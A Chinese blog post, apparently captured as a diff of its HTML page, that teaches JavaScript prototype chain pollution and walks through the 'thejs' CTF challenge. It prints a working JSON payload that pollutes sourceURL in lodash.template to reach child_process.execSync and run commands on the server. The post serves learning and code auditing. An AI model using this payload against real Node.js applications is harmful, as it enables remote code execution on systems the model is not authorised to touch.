@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="决定我们成为什么样的人，不是我们的能力，而是选择。  这个内容在没入门的时候，就听说过，当时只是草草看了下，知道了这个概念；当我入了门，走了几步后，整好碰到了这样的题目，当时又是了解不深入，只是懂了一丁点，会用payload；现在是第三次了，不说深入地探究透彻，只求能够弄清晰一点。当别人问我这什么东西时，能够说上一两句。 在写之前再说两句，JavaScript和Java并没有关系，语法和使用也可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaScript原型链污染">
+<meta property="og:url" content="https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/index.html">
+<meta property="og:site_name" content="crownZ&#39;s Blog">
+<meta property="og:description" content="决定我们成为什么样的人，不是我们的能力，而是选择。  这个内容在没入门的时候，就听说过，当时只是草草看了下，知道了这个概念；当我入了门，走了几步后，整好碰到了这样的题目，当时又是了解不深入，只是懂了一丁点，会用payload；现在是第三次了，不说深入地探究透彻，只求能够弄清晰一点。当别人问我这什么东西时，能够说上一两句。 在写之前再说两句，JavaScript和Java并没有关系，语法和使用也可">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507145604.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507150432.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507152423.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507152525.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507155129.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507170540.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507172353.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507194942.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507203706.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507210221.png">
+<meta property="article:published_time" content="2020-05-07T09:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-07T13:03:11.000Z">
+<meta property="article:author" content="crownZ">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="JavaScript">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507145604.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JavaScript原型链污染</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/05/08/recent_thought/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/05/04/linux_process_control/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&text=JavaScript原型链污染"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&is_video=false&description=JavaScript原型链污染"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JavaScript原型链污染&body=Check out this article: https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&title=JavaScript原型链污染"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&name=JavaScript原型链污染&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://crownz-sec.github.io/2020/05/07/prototype_chain%20_pollution/&t=JavaScript原型链污染"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">原型与原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">原型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.2.</span> <span class="toc-text">原型链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.</span> <span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">利用手段</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">例题</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        JavaScript原型链污染
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">crownZ</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-05-07T09:00:00.000Z" itemprop="datePublished">2020-05-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Web/">Web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/JavaScript/" rel="tag">JavaScript</a>, <a class="tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>, <a class="tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>决定我们成为什么样的人，不是我们的能力，而是选择。</p>
+</blockquote>
+<p>这个内容在没入门的时候，就听说过，当时只是草草看了下，知道了这个概念；当我入了门，走了几步后，整好碰到了这样的题目，当时又是了解不深入，只是懂了一丁点，会用payload；现在是第三次了，不说深入地探究透彻，只求能够弄清晰一点。当别人问我这什么东西时，能够说上一两句。</p>
+<p>在写之前再说两句，JavaScript和Java并没有关系，语法和使用也可以说是完全不同的。但它之所以叫JavaScript，是因为发明者所在公司的老板极度推崇Java，为了攀上当时如日中天的Java，那老板就把这个浏览器所使用的解释型语言命名为JavaScript。u1s1，这个称呼在之前搞得我晕头转向，直到最近一段时间，了解了一下历史才明白了。</p>
+<h1 id="原型与原型链"><a href="#原型与原型链" class="headerlink" title="原型与原型链"></a>原型与原型链</h1><p>JavaScript 是一门面向对象的语言，但是在ES6规范之前，JavaScript中没有class语法。虽然ES6中引入了class关键字，但那只是语法糖，JavaScript 仍然是基于原型的。</p>
+<h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><p>原型的定义：<strong>原型是JavaScript中继承的基础,JavaScript的继承就是基于原型的继承</strong>。</p>
+<ol>
+<li>所有引用类型（函数，数组，对象）都拥有__proto__属性（隐式原型)</li>
+<li>所有函数拥有prototype属性（显式原型）</li>
+</ol>
+<p>JavaScript中的每个函数都有一个prototype属性，它指向通过该构造函数创建的实例对象的原型。同时，每个实例对象也都有一个__proto__属性用来指向实例对象的原型。实例对象的 __proto__ 与创建该实例对象的构造函数的prototype是相等的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507145604.png"></p>
+<p>用图来理解的话，就是下面这样。<br><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507150432.png"></p>
+<p>而且，每个原型对象都有一个constructor属性，指向相关联的构造函数，所以构造函数和构造函数的prototype是可以相互指向的。实例对象也可以访问constructor属性指向其构造函数。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507152423.png"></p>
+<h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>在JavaScript中，如果想访问某个属性，首先会在实例对象（test）的内部寻找，如果没找到，就会在该对象的原型（test.__proto__，即 Test.prototype）上找。我们知道，对象的原型也是对象，它也有原型，如果在对象的原型上也没有找到目标属性，则会在对象的原型的原型（Test.prototype.__proto__）上寻找。以此类推，直到找到这个属性或者到达了最顶层（null），根据定义，null没有原型，是原型链最后一个环节。在原型上一层一层寻找，这就是原型链。</p>
+<p>实例对象原型的原型是Object.prototype，而它的原型是null，null 没有原型，所以 Object.prototype 就是原型链的最顶端。<br><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507152525.png"></p>
+<p>JavaScript中的所有对象都来自Object，Object 位于原型链的最顶端，几乎所有 JavaScript 的实例对象都是基于 Object。</p>
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>在JavaScript中，访问一个对象的属性可以用a.b.c或者a[“b”][“c”]来访问。因为对象是无序的，当使用第二种方式访问对象，只能使用指明下标的方式去访问。所以，可以通过a[“__proto__“]去访问其原型对象。</p>
+<p>在一个js应用中，如果攻击者控制并修改了一个对象的原型，那么将会影响所有和这个对象来自同一个类、父祖类的对象。跟水资源污染有点一样，源头被污染了，其下面的河流都将被污染，难怪用污染这个修饰词。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = <span class="string">&#x27;father&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = <span class="string">&#x27;son&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father();	 <span class="comment">//将Son的原型设为Father</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> son = <span class="keyword">new</span> Son();</span><br><span class="line">Father.prototype[<span class="string">&#x27;money&#x27;</span>] = <span class="number">100</span>;<span class="comment">//给Father原型添加属性</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name);	</span><br><span class="line"><span class="built_in">console</span>.log(son.money);</span><br></pre></td></tr></table></figure>
+<p>在上面代码中，有两个函数，Son的原型为Father，可以看作是Son继承自Father。因为Son函数有name这个属性，所以son.name有输出；Son函数在定义的时候，没有money这个属性，但son.money仍有输出，是因为我们给Father的原型增加了一个money属性。当输出son.money时，js发现Son没有该属性，就去Father中寻找，还找不到，就去Father原型中找，这里找到了添加的money属性，就会输出。<br><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507155129.png"></p>
+<h1 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h1><p>存在可控的对象键值时，代码中有以下几种情况：</p>
+<ol>
+<li>merge等对象递归合并操作</li>
+<li>对象克隆</li>
+<li>路径查找属性然后修改属性</li>
+</ol>
+<p>merge常见代码如下，可以说是代码审计的一个标志。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在合并的过程中，存在赋值的操作target[key] = source[key]。那么，这个key如果是__proto__，是不是就可以原型链污染?</p>
+<p>用下面的代码进行实验：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到结果，虽然合并成功了，但原型并没有被污染。<br><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507170540.png"></p>
+<p>这是因为用JavaScript创建o2的过程（let o2 = {a: 1, “__proto__“: {b: 2}}）中，__proto__已经代表o2的原型了，是o2的一个属性。此时遍历o2的所有键名，拿到的是[a, b]。这里的__proto__不是一个key，自然也不会修改Object的原型。</p>
+<p>要想让__proto__被认为是一个键名，需要使用JSON.parse函数。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，新建的o3对象，也存在b属性，说明Object已经被污染。<br><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507172353.png"></p>
+<p>这是因为，JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
+<p>merge操作是最常见的可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>这里是选择p神出的<a target="_blank" rel="noopener" href="https://code-breaking.com/puzzle/9/">thejs</a>。</p>
+<p>先下源码，需要用<code>git clone https://github.com/phith0n/code-breaking</code>将整个codebreaking下载，不然权限有问题。下载好，然后docker部署环境。</p>
+<p>前端那个页面只是一个提交编程语言和ctf类别，其他什么都得不到。<br><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507194942.png"></p>
+<p>这是一个代码审计题目，这里默认是可以看源码的。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json()) <span class="comment">//对post请求的请求体进行解析</span></span><br><span class="line">app.use(<span class="string">&#x27;/static&#x27;</span>, express.static(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;thejs.session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: randomize(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>), <span class="comment">// 随机数</span></span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">&#x27;ejs&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// 定义模板引擎</span></span><br><span class="line">    fs.readFile(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;   <span class="comment">//读文件 filepath</span></span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)  <span class="comment">//模板化</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)   <span class="comment">//动态引入变量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>)</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//定义session</span></span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;		<span class="comment">//获取post数据</span></span><br><span class="line">        data = lodash.merge(data, req.body) <span class="comment">// merge 合并字典</span></span><br><span class="line">        req.session.data = data		<span class="comment">//合并后赋值给session</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">language</span>: data.language, </span><br><span class="line">        <span class="attr">category</span>: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening on port 3000!`</span>))</span><br></pre></td></tr></table></figure>
+<p>整个应用逻辑为，将用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p>
+<p>我们可以看到比较敏感的merge函数，还存在可控点req.body。但req.body仅仅是提交数据的一个点，我们还要知道要怎样去构造数据。</p>
+<p>我们在提交post数据之后，app.engine会在请求之后进行渲染。进行渲染那段代码中，它调用了lodash.template这个函数。</p>
+<p>跟进lodash/template.js。<br><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507203706.png"></p>
+<p>可以看到options是一个对象，sourceURL取到了其options.sourceURL属性。sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.sourceURL + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</p>
+<p>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中。紧接着渲染模版，就可以成功执行代码，造成任意代码执行漏洞。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source)</span><br><span class="line">    .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>下面是p神的payload：<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></p>
+<ul>
+<li>因为在渲染时会将sourceURL直接拼接到页面中，但前面有个注释，通过\n就可以bypass掉。</li>
+<li>child_process是一个子进程模块，可以用来执行命令并返回结果。global.process.mainModule.constructor._load是为了加载这个模块。</li>
+<li>前面的return e … delete …，看别人说是用完之后删除原型键值对，但删除完，payload就不能用了…，也就不管了。</li>
+</ul>
+<p>在实际post传值的时候，要注意把Content-Type改为json形式的，来让__proto__作为键名，而非属性。<br><img src="https://cdn.jsdelivr.net/gh/crownz-sec/Blog_Source@master/img/20200507210221.png"></p>
+<blockquote>
+<p>参考</p>
+<p>[1] <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a></p>
+<p>[2] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7182#reply-14302">浅析javascript原型链污染攻击</a></p>
+<p>[3] <a target="_blank" rel="noopener" href="https://www.smi1e.top/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">JavaScript 原型链污染</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解JavaScript Prototype污染攻击</a></p>
+<p>[5] <a target="_blank" rel="noopener" href="http://yiyangqianxi.jxustctf.top/year/03/04/JavaScript/">JavaScript学习小结</a></p>
+<p>[6] <a target="_blank" rel="noopener" href="https://threezh1.com/2020/01/30/NodeJsVulns/">Node.js 常见漏洞学习与总结</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
